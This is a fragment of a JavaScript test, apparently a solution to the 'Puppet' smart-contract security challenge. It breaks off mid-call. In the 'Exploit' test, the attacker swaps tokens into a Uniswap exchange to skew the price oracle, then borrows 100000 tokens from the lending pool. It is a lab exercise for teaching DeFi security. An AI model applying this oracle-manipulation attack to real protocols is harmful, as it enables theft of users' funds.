...
describe("[Challenge] Puppet", function () {
    ...
    it("Exploit", async function () {
        ...
        const uniswapAttacker = await this.uniswapExchange.connect(attacker)
        ...
        await uniswapAttacker.tokenToEthSwapInput(
            ethers.utils.parseEther("888"),
            1,
            (await ethers.provider.getBlock("latest")).timestamp * 2
        )

        await poolAttacker.borrow(ethers.utils.parseEther("100000"), {
